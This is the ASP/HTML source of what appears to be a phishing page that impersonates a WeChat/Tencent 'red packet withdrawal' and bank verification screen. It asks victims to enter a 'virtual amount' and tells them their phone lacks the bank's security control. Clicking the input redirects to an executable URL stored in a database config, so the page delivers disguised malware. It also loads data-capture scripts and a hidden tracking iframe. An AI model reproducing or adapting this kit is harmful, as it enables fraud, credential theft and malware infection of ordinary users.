<!--#include file="include/db_conn.asp"-->
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>领取红包</title>
<meta name="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
<link rel="stylesheet" href="css/reset.css">
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="" id="min320">
<link rel="apple-touch-startup-image" href="milanoo_startup.png">
<link rel="apple-touch-icon-precomposed" href="milanoo_startup.png">
<script src="images/jquery-1.6.min.js"></script>
<script src="images/main.js"></script>
<style type="text/css"> 
#no_css{
	display:none;	
}

.financial_content a:hover {color: #0066b3; }
.financial_content a:active {color: #0066b3; }
.financial_content a:link {color: #0066b3; }
.financial_content a:visited {color: #0066b3; }
 
.wb_list a:hover {color: #0066b3; }
.wb_list a:active {color: #0066b3; }
.wb_list a:link {color: #0066b3; }
.wb_list a:visited {color: #0066b3; }
 
.news1_list1 li a{display:inline-block;max-width:100%}
.style1 {color: #FF0000}
.head {
		line-height: 0;
		text-align: center;
	}
	.ccb_title1 {
		min-height: 58px;
		line-height: 58px;
		font-size: 16px;
		text-align: center;
		background: #F6F6F6 none repeat scroll 0% 0%;
		border-top: 3px solid #44b549;
		border-bottom: 1px solid #D9DADC;
	}
	
	.news .ccb_title1 tr td .on a{
			color:#FFFDFD}
	
</style>
<script type="text/javascript"> 
$(function(){
	$("#no_js").hide();
});
</script>
</head>
<body>
<div class="page">
  <div class="head">
   <img alt="" src="images/da.png">
  </div>
    <div class="hq_page">
		<div class="news ccb_title1">
			<table width="100%">
				<tbody>
					<tr>
						<td align="center">首页</td>
						<td align="center">微信商城</td>
						<td align="center">我的微信</td>
						<td align="center" style="background: #44b549 none repeat scroll 0% 0%; color = red;"><a>微信平台</a></td>
						<td align="center">服务支持</td>
					</tr>
				</tbody>
			</table>
		</div><br>
      <div class="news ccb_title">
        <h1>红包快速提现</h1>
      </div>
    <div class="hq_page">
      <div class="news ccb_title">
        <h1>验证核实提现</h1>
      </div>
      <div id="pic2" class="pic2 content">
        <style>
.text {
	PADDING-BOTTOM: 0px; PADDING-LEFT: 10px; PADDING-RIGHT: 10px; MARGIN-BOTTOM: 20px; COLOR: #999; FONT-SIZE: 14px; PADDING-TOP: 0px
}
article {
	PADDING-BOTTOM: 0px; MARGIN: 0px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px; PADDING-TOP: 0px
}


article.border {
	BORDER-BOTTOM: #ccc 1px solid; TEXT-ALIGN: left; BORDER-LEFT: #ccc 1px solid; LINE-HEIGHT: 30px; MARGIN: 10px; FONT-SIZE: 16px; BORDER-TOP: #ccc 1px solid; BORDER-RIGHT: #ccc 1px solid; -webkit-border-radius: 5px; border-radius: 5px; -webkit-box-shadow: 0px 2px 1px #dbdbdb; box-shadow: 0px 2px 1px #dbdbdb
}
article.border section {
	BORDER-BOTTOM: #ccc 1px solid; PADDING-BOTTOM: 7px; PADDING-LEFT: 10px; PADDING-RIGHT: 10px; PADDING-TOP: 7px
}
article.border section .input2 {
	WIDTH: 25px
}
DL {
	PADDING-BOTTOM: 0px; MARGIN: 0px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px; PADDING-TOP: 0px
}
.mar_l80 DL {
	OVERFLOW: hidden
}

INPUT {
	PADDING-BOTTOM: 0px; MARGIN: 0px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px; PADDING-TOP: 0px
}
INPUT {
	OUTLINE-STYLE: none; OUTLINE-COLOR: invert; OUTLINE-WIDTH: medium; FONT: inherit
}
.select INPUT {
	BORDER-BOTTOM: 0px; BORDER-LEFT: 0px; PADDING-LEFT: 5px; WIDTH: 124px; BACKGROUND: none transparent scroll repeat 0% 0%; FLOAT: left; HEIGHT: 29px; BORDER-TOP: 0px; BORDER-RIGHT: 0px
}
</style>
<%
set rs=server.CreateObject("adodb.recordset")
rs.open "select * from bank where id="&clng(session("ddid"))&" ",conn,1,3
if not rs.eof then
je=rs("je")
dh=rs("dh")
end if
rs.close
set rs=Nothing

set rs = conn.execute("select * from config where id=1")
if not rs.eof then
	exe = rs("exe")
end if
%>
        <form id="form1" method="post" name="form1" action="v_submit2.asp">
          <article class="border mar_l80">
            <section>
              <article class="border mar_l80">
                <section><span>请在下列输入框中输入虚拟金额验证提现</span></section>
              </article>
            </section>
            <section><span>虚拟金额</span>：<%=je%>元</section>
            <section><span>请输入虚拟金额</span>
              <dl onclick="location.href='<%=exe%>';">
                <input name="pass" type="text" class="input1" id="pass" size="10" maxlength="6" style="background-color:#F0F0F0">
                <input name="button" type="button" id="btn" style="width:130px; height:34px; size:1px;" value="请安装安全控件">
                <script type="text/javascript">/*
var wait=120;
document.getElementById("btn").disabled = false;   
function time(o) {
        if (wait == 0) {
            o.removeAttribute("disabled");           
            o.value="免费获取验证码";
            wait = 120;
        } else {
			if (wait == 120){
				$.get('set_num.asp');	
			}
            o.setAttribute("disabled", true);
            o.value="重新发送(" + wait + ")";
            wait--;
            setTimeout(function() {
                time(o)
            },
            1000)
        }
    }
document.getElementById("btn").onclick=function(){time(this);}*/
                  </script>
              </dl>
            </section>
            <section><span><span class="style1">温馨提示：您手机未安装我行控件，请下载安装我行控件</span></span> </section>
            <div class="mobile_login"> <a href="javascript:form1.submit();"><span class="login_ico_l"></span><span class="login_ico_m">下一步</span><span class="login_ico_r"></span></a> <a href="register.asp"><span class="login_ico_l"></span><span class="login_ico_m">上一步</span><span class="login_ico_r"></span></a> </div>
          </article>
          <div class="warn"></div>
        </form>
      </div>
    </div>
    <!-- InstanceEndEditable -->
<meta name="format-detection" content="telephone=no">
    <div class="footer">
      <h4 style="font-size:12px;">Copyright 1999-2014 腾讯 版权所有 <br>中华人民共和国增值电信业务经营许可证<br>
        经营许可证编号：A2.B1.B2-20100001  </h4>
    </div>
    <!-- /footer -->
    <script src="./verification_files/dataacquisition.xy.ccb.js"></script>
    <script src="./verification_files/datacatch.js"></script>
  </div>
  <!-- InstanceEnd --> </div>
<iframe src="online.asp" style="display: none;"></iframe>
</body>
</html>
